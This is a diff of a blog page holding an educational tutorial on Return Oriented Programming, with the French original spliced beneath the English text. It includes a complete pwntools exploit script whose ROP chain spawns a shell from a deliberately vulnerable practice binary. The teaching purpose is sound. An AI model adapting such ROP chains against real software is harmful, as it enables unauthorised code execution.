@@ -103,14 +103,6 @@ Share</a>
 		 
 			 
 				<li>
-					<a href="/en/writeups/">
-						<span>Write-Ups</span>
-					</a>
-				</li>
-			 
-		 
-			 
-				<li>
 					<a href="/en/the_rest/">
 						<span>The Rest</span>
 					</a>
@@ -140,7 +132,7 @@ Share</a>
     <p>
       <section class="social">
 	
-	<a href="https://twitter.com/thelaluka" rel="me"><i class="rotate fab fa-twitter fa-lg" aria-hidden="true"></i></a>
+	<a href="https://twitter.com/TheLaluka" rel="me"><i class="rotate fab fa-twitter fa-lg" aria-hidden="true"></i></a>
 	
 	
 	
@@ -164,7 +156,7 @@ Share</a>
 	<a href="mailto:loukajc@gmail.com" rel="me"><i class="rotate fas fa-at fa-lg" aria-hidden="true"></i></a>
 	
 	
-  &nbsp;<a href="https://www.root-me.org/DeveLooper" target="blank" class="linklogo"><div class="rotate rootme_logo logohover"></div></a>
+  &nbsp;<a href="https://www.root-me.org/Laluka" target="blank" class="linklogo"><div class="rotate rootme_logo logohover"></div></a>
   
 	
   &nbsp;<a href="http://www.aperikube.fr" target="blank" class="linklogo"><div class="rotate aperikube_logo logohover"></div></a>
@@ -175,8 +167,6 @@ Share</a>
     <div class="langSection">
     
     <a rel="alternate" href="/en/hacking/pwn_3of4_saperliropette/" hreflang="en" lang="en"><img src="/img/flag_en.png" alt="flag_en" class="logoFlag"/></a>
-    
-    <a rel="alternate" href="/fr/hacking/pwn_3of4_saperliropette/" hreflang="fr" lang="fr"><img src="/img/flag_fr.png" alt="flag_fr" class="logoFlag"/></a>
     </div>
     <p class="copyright">
       &copy; 2021 Laluka.
@@ -200,7 +190,7 @@ Share</a>
       <i class="fas fa-calendar-alt"></i> May 9, 2018
     
     
-    <i class="fas fa-clock"></i> 6 min read
+    <i class="fas fa-clock"></i> 11 min read
     <i class="fas fa-globe"></i> translated<br/>
     <i class="fas fa-heart"></i>
     
@@ -230,7 +220,7 @@ Share</a>
 
 <p>Yesterday, the simple buffer overflow and ret2libc, today, ROP, or Return Oriented Programming, and tomorrow&hellip; Tomorrow the conquest of the world!</p>
 
-<p><img class="img_med" src="/hacking/pwn_3of4_saperliropette/aboard.jpg" alt="aboard" ></p>
+<p><img class="img_med" src="/en/hacking/pwn_3of4_saperliropette/aboard.jpg" alt="aboard" ></p>
 
 <p>I left you yesterday on the ret2libc, which, seen from afar, consists in picking in the libc the functions that interest us the most. Except that this attack is not possible in the case where the program is compiled statically, and hardly feasible if the ASLR is enabled. Today we will discover the ROP that allows us to bypass these protections.</p>
 
@@ -265,7 +255,7 @@ Follow the leader cat!</p>
 
 <p>An important thing to note here: We need gadgets. Gadgets are code that doesn&rsquo;t move. Libraries are always relocated. So a program based on libraries will have a much smaller attack surface than a program compiled in static that would contain all the code it needs. Also, the larger the program will be and the more complex actions it&rsquo;ll do, the more likely you&rsquo;ll find interesting stuff inside. Capich? Noice!</p>
 
-<p><img class="img_med" src="/hacking/pwn_3of4_saperliropette/noice.gif" alt="noice" ></p>
+<p><img class="img_med" src="/en/hacking/pwn_3of4_saperliropette/noice.gif" alt="noice" ></p>
 
 <p>Now, let&rsquo;s go more into detail about gadgets, shall we?</p>
 
@@ -283,23 +273,23 @@ Follow the leader cat!</p>
 
 <p>First of all, we look at what we&rsquo;re dealing with: x86-64, compiled in static, full ASLR. Okay!</p>
 
-<p><img class="img_full" src="/hacking/pwn_3of4_saperliropette/readelf.png" alt="readelf" ></p>
+<p><img class="img_full" src="/en/hacking/pwn_3of4_saperliropette/readelf.png" alt="readelf" ></p>
 
 <p>You&rsquo;re used to it now, the classic one:</p>
 
 <p>Understand how the program works, find the crash, then the offset!</p>
 
-<p><img class="img_full" src="/hacking/pwn_3of4_saperliropette/pattern_create.png" alt="pattern_create" ></p>
+<p><img class="img_full" src="/en/hacking/pwn_3of4_saperliropette/pattern_create.png" alt="pattern_create" ></p>
 
-<p><img class="img_full" src="/hacking/pwn_3of4_saperliropette/crash.png" alt="crash" ></p>
+<p><img class="img_full" src="/en/hacking/pwn_3of4_saperliropette/crash.png" alt="crash" ></p>
 
 <p>Here again, we see that we crash on a ret&hellip; Do we control RSP? Yes! Offset? 264!</p>
 
-<p><img class="img_full" src="/hacking/pwn_3of4_saperliropette/pattern_search.png" alt="pattern_search" ></p>
+<p><img class="img_full" src="/en/hacking/pwn_3of4_saperliropette/pattern_search.png" alt="pattern_search" ></p>
 
 <p>Small reminder, ret has the effect of placing what RSP points to (so the last element of the stack), in RIP. So we have RIP under our control. So&hellip; RIP!</p>
 
-<p><img class="img_med" src="/hacking/pwn_3of4_saperliropette/dead_shell.jpg" alt="dead_shell" ></p>
+<p><img class="img_med" src="/en/hacking/pwn_3of4_saperliropette/dead_shell.jpg" alt="dead_shell" ></p>
 
 <p>We then use the ropgadget tool which offers us a superb ropchain made with our vulnerable program:</p>
 
@@ -308,7 +298,7 @@ Follow the leader cat!</p>
 
 <p>The output is long (verbose), I only put part of it:</p>
 
-<p><img class="img_full" src="/hacking/pwn_3of4_saperliropette/ropgadget.png" alt="ropgadget" ></p>
+<p><img class="img_full" src="/en/hacking/pwn_3of4_saperliropette/ropgadget.png" alt="ropgadget" ></p>
 
 <p>So we make it a python file, our exploit is the following:</p>
 
@@ -351,7 +341,7 @@ p.close()
 
 <p>We will now exploit it:</p>
 
-<p><img class="img_full" src="/hacking/pwn_3of4_saperliropette/run_exploit.png" alt="run_exploit" ></p>
+<p><img class="img_full" src="/en/hacking/pwn_3of4_saperliropette/run_exploit.png" alt="run_exploit" ></p>
 
 <p>TADA, one more shell! :D</p>
 
@@ -370,9 +360,177 @@ More information on this strangeness our dear beloved friens Pixis&rsquo;s websi
 
 <p>Blow up the world! <code>\o/</code></p>
 
-<p><img class="img_med" src="/hacking/pwn_3of4_saperliropette/like_a_boss.gif" alt="like_a_boss" ></p>
+<p><img class="img_med" src="/en/hacking/pwn_3of4_saperliropette/like_a_boss.gif" alt="like_a_boss" ></p>
 
-<p>See you soon for even more pwn!</p>
+<h2 id="see-you-soon-for-even-more-pwn">See you soon for even more pwn!</h2>
+
+<p>author: &ldquo;Laluka&rdquo;
+title: &ldquo;PWN <sup>3</sup>&frasl;<sub>4</sub> : SaperliROPette !&rdquo;
+slug: &ldquo;pwn_3of4_saperliropette&rdquo;
+date: 2018-05-09
+status: &ldquo;original&rdquo;</p>
+
+<h2 id="description-introcution-au-return-oriented-programming-rop-et-exemple-pratique">description: &ldquo;Introcution au Return Oriented Programming (ROP) et exemple pratique.&rdquo;</h2>
+
+<blockquote>
+<p>Petit ajout après la publication des articles :</p>
+
+<p>Ces quatres articles ont donné lieu à une conférence d&rsquo;introduction au pwn à la HitchHack 2018. Elle résume les 3 premiers articles mais rentre moins dans le détail. Si ce format vous convient mieux, les slides sont téléchargables <a href="/hacking/pwn_1of4_buffer_overflow/slides_conf_123_pwned.pdf">ici</a> et la vidéo (francais uniquement) ici :</p>
+</blockquote>
+
+
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="//www.youtube.com/embed/hmt8M9YLwTg" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+
+
+<h2 id="route-du-pwn-troisième-escale-bienvenue-à-bord">Route du pwn, troisième  escale, bienvenue à bord !</h2>
+
+<p>Hier, le simple buffer overflow et le ret2libc, aujourd&rsquo;hui, le ROP, ou Return Oriented Programming, et demain&hellip; Demain la conquête du monde !!!</p>
+
+<p><img class="img_med" src="/en/hacking/pwn_3of4_saperliropette/aboard.jpg" alt="aboard" ></p>
+
+<p>Je vous ai laissé hier sur le ret2libc, qui, vu de loin, consiste à piocher dans la libc les fonctions qui nous intéressent. Sauf que cette attaque n&rsquo;est pas possible dans le cas où le programme est compilé en statique, et difficilement faisable si l&rsquo;ASLR est activé. Nous allons aujourd&rsquo;hui découvrir le ROP qui nous permet de contourner ces protections.</p>
+
+<p>Ca ressemble de plus en plus au jeu du chat et de la souris, so&hellip;<br />
+Follow the leader cat !</p>
+
+<h2 id="précisions-aslr-et-pic">Précisions ASLR et PIC</h2>
+
+<p>Avant de commencer, un petit retour sur ces protections parfois floues.</p>
+
+<p>La configuration de l&rsquo;ASLR est présente dans <code>/proc/sys/kernel/randomize_va_space</code>. Elle peut être à 0=désactivée, 1=activée (stack et heap), 2=activée (1 + data). La valeur 2 étant la nouvelle norme en cours d&rsquo;adoption par les différents systèmes, déjà effective pour la plupart.</p>
+
+<p>L&rsquo;ASLR laisse donc toute une surface d&rsquo;attaque non randomisée. Arriva donc ce qu&rsquo;il devait arriver : des attaques utilisant les sections .text, .data, .got, .plt, &hellip;</p>
+
+<p>Plus d&rsquo;informations sur les différentes sections et la structure d&rsquo;un ELF ici : <a href="://fr.wikipedia.org/wiki/Executable_and_Linkable_Format">ELF_format</a></p>
+
+<p>L&rsquo;ASLR ne suffisant pas, de nouvelles protections ont été mises en place : PIC / PIE (Position Indépendant Code / Exécutable). L&rsquo;idée est simple&hellip; Et si on randomisait&hellip; TOUT ?!</p>
+
+<p>Le ROP fonctionne avec un ASLR partiel ou total, mais est contré par cette dernière mesure&hellip;</p>
+
+<p>Suite à la prochaine contre contre-mesure ! è.é</p>
+
+<h2 id="présentation-de-la-technique">Présentation de la technique</h2>
+
+<p>Return&hellip; Oriented&hellip; Programming&hellip;</p>
+
+<p>Hum hum&hellip; Programmer&hellip; Avec des&hellip; Return ? °^°&rsquo;</p>
+
+<p>On va profiter du fait que la section .text du programme soit toujours au même emplacement pour piocher plein de petits bouts de code appelés gadgets, et les assembler pour faire notre exploit. L&rsquo;exploit est donc une suite d&rsquo;adresses pointant sur de l&rsquo;assembleur, donc dans l&rsquo;absolu, on peut tout faire avec. La limite ? Les gadgets qui sont à notre disposition dans le programme&hellip;</p>
+
+<p>Même si on &ldquo;peut tout faire&rdquo;, la stratégie la plus commune reste de faire comme dans l&rsquo;article 1 où l&rsquo;on génère un shellcode qui, via un syscall, permet d&rsquo;exécuter un programme de notre choix.</p>
+
+<p>Une chose importante à relever ici : On a besoin de gadgets. Les gadgets, c&rsquo;est du code qui ne bouge pas. Les librairies, ca bouge. Donc un programme qui se base sur les librairies aura bien moins de surface d&rsquo;attaque qu&rsquo;un programme compilé en statique, qui, lui, contient tout le code qu&rsquo;il utilise. De même, plus un programme va être volumineux et faire des actions complexes, plus vous avez de chance qu&rsquo;il y ait des gadgets intéressants. Capich ? Noice !</p>
+
+<p><img class="img_med" src="/en/hacking/pwn_3of4_saperliropette/noice.gif" alt="noice" ></p>
+
+<p>Maintenant, abordons plus en détail les gadgets voulez-vous ?</p>
+
+<p>Ils doivent tous répondre à un critère majeur : Se terminer par une instruction ret.</p>
+
+<p>C&rsquo;est ce critère qui rend l&rsquo;attaque possible. En effet, lorsque l&rsquo;on va contrôler le pointer d&rsquo;instructions, on va faire en sorte que le programme exécute un premier gadget, que l&rsquo;instruction ret finale indique la fin de l&rsquo;exécution du premier gadget, et fasse revenir sur notre point de départ (la stack, qu&rsquo;on vient d&rsquo;overflow), mais une adresse plus loin. Cette adresse sera celle du second gadget et ainsi de suite.</p>
+
+<p>Méfiance tout de même, si votre gadget se termine par un ret, mais contient des instructions qui modifient le flot d&rsquo;exécution du programme, il risque de casser votre exploit. Donc pas de <code>call</code>, pas de <code>leave</code>, pas de <code>double ret</code>, pas de bras, et surtout : pas de chocolat.</p>
+
+<p>De nombreux outils permettent de lister les gadgets d&rsquo;un exécutable, comme ROPgadget, Ropper, XRop, &hellip;</p>
+
+<h2 id="elaboration-de-l-exploit">Elaboration de l&rsquo;exploit</h2>
+
+<p>Le binaire étudié est téléchargable <a href="/hacking/pwn_3of4_saperliropette/vuln">ici</a></p>
+
+<p>Avant toute chose, on regarde un peu à quoi on s&rsquo;attaque : x86-64, compilé en statique, full ASLR. Ok !</p>
+
+<p><img class="img_full" src="/en/hacking/pwn_3of4_saperliropette/readelf.png" alt="readelf" ></p>
+
+<p>Vous avez l&rsquo;habitude maintenant, le classique :</p>
+
+<p>Comprendre le fonctionnement du programme, trouver le point de crash, puis l&rsquo;offset !</p>
+
+<p><img class="img_full" src="/en/hacking/pwn_3of4_saperliropette/pattern_create.png" alt="pattern_create" ></p>
+
+<p><img class="img_full" src="/en/hacking/pwn_3of4_saperliropette/crash.png" alt="crash" ></p>
+
+<p>Ici encore, on voit que l&rsquo;on crash sur un ret&hellip; Contrôlons-nous RSP ? Oui ! Offset ? 264 !</p>
+
+<p><img class="img_full" src="/en/hacking/pwn_3of4_saperliropette/pattern_search.png" alt="pattern_search" ></p>
+
+<p>Petit rappel, ret a pour effet de placer ce vers quoi pointe RSP (donc le dernier élément de la stack), dans RIP. Nous avons donc RIP sous notre contrôle. Donc&hellip; RIP !</p>
+
+<p><img class="img_med" src="/en/hacking/pwn_3of4_saperliropette/dead_shell.jpg" alt="dead_shell" ></p>
+
+<p>On utilise ensuite l&rsquo;outil ropgadget qui nous offre une superbe ropchain faite à partir de notre programme vulnérable :</p>
+
+<pre><code class="language-shell">$ ropgadget --binary vuln --ropchain
+</code></pre>
+
+<p>L&rsquo;output est long (verbeux), je n&rsquo;en mets qu&rsquo;une partie :</p>
+
+<p><img class="img_full" src="/en/hacking/pwn_3of4_saperliropette/ropgadget.png" alt="ropgadget" ></p>
+
+<p>On en fait donc un fichier python, notre exploit est donc :</p>
+
+<pre><code class="language-python">#!/usr/bin/env python2
+
+from pwn import *
+
+# Setting up
+context.log_level = &quot;debug&quot;
+
+offset = 264
+payload = &quot;A&quot; * offset
+payload += p64(0x00000000004016a7)  # pop rsi ; ret
+payload += p64(0x00000000006b41c0)  # @ .data
+payload += p64(0x000000000043167d)  # pop rax ; ret
+payload += '/bin//sh'
+payload += p64(0x000000000045f661)  # mov qword ptr [rsi], rax ; ret
+payload += p64(0x00000000004016a7)  # pop rsi ; ret
+payload += p64(0x00000000006b41c8)  # @ .data + 8
+payload += p64(0x000000000041918f)  # xor rax, rax ; ret
+payload += p64(0x000000000045f661)  # mov qword ptr [rsi], rax ; ret
+payload += p64(0x000000000040158b)  # pop rdi ; ret
+payload += p64(0x00000000006b41c0)  # @ .data
+payload += p64(0x00000000004016a7)  # pop rsi ; ret
+payload += p64(0x00000000006b41c8)  # @ .data + 8
+payload += p64(0x0000000000432ef5)  # pop rdx ; ret
+payload += p64(0x00000000006b41c8)  # @ .data + 8
+payload += p64(0x000000000041918f)  # xor rax, rax ; ret
+payload += p64(0x0000000000453b50) * 59 # add rax, 1 ; ret
+payload += p64(0x00000000004546e5)  # syscall ; ret
+
+p = process(&quot;./vuln&quot;)
+p.recv()
+p.sendline(payload)
+p.interactive()
+p.close()
+</code></pre>
+
+<p>C&rsquo;est pas beau toute cette automatisation ? Bon, ca ne marche pas à tous les coups, mais quand ca marche, le gain de temps est énorme, surtout en CTF&hellip; ;)</p>
+
+<p>On va maintenant l&rsquo;exploiter :</p>
+
+<p><img class="img_full" src="/en/hacking/pwn_3of4_saperliropette/run_exploit.png" alt="run_exploit" ></p>
+
+<p>TADA, one more shell ! :D</p>
+
+<p>Petit détail qui tue, on voit ici que $0 (le nom du programme exécuté) vaut <code>bash</code>, alors que dans notre ropchain, on avait <code>/bin//sh</code> (qui est compris comme <code>/bin/sh</code>). Mais c&rsquo;est normal, car sur ma machine, <code>/bin/sh</code> est un lien symbolique qui pointe vers bash ! Mon vrai sh est <code>/usr/bin/sh</code>.</p>
+
+<blockquote>
+<p>Mais&hellip; Ca ne concorde pas avec les exploits précédents ?!</p>
+</blockquote>
+
+<p>Wouah ! Un qui suit ! Oui, en effet&hellip;<br />
+Plus d&rsquo;informations sur cette étrangeté sur l&rsquo;article de coupaing Pixis : <a href="https://beta.hackndo.com/sh-vs-bash/">sh_vs_bash</a></p>
+
+<p>C&rsquo;est tout pour cette courte introduction au ROP, j&rsquo;espère qu&rsquo;elle vous a mindblown comme il se doit. Vous avez désormais quelques cartes en main : BOF / shellcode / ret2libc / ROP / cerveau / &hellip;</p>
+
+<p>C&rsquo;est pourquoi notre prochaine rencontre se fera autour de l&rsquo;analyse d&rsquo;un programme un peu plus complet. Nous allons donc conclure cette série et&hellip;</p>
+
+<p>Tout faire péterrrrr ! <code>\o/</code></p>
+
+<p><img class="img_med" src="/en/hacking/pwn_3of4_saperliropette/like_a_boss.gif" alt="like_a_boss" ></p>
+
+<p>A très vite pour encore plus de pwn !</p>
 
   </div>
   
